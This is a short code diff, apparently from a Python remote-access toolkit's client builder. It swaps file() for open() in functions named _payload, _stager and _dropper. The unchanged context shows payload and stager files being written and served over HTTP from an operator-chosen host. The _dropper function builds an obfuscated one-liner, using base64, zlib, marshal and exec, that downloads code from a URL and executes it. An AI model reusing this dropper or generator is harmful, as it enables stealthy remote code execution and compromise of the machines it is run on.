@@ -325,7 +325,7 @@ def _payload(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(payload)
 
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
@@ -380,7 +380,7 @@ def _stager(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(stager)
 
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
@@ -404,7 +404,7 @@ def _dropper(options, **kwargs):
     if not name.endswith('.py'):
         name += '.py'
     dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
-    with file(name, 'w') as fp:
+    with open(name, 'w') as fp:
         fp.write(dropper)
 
     if options.freeze:
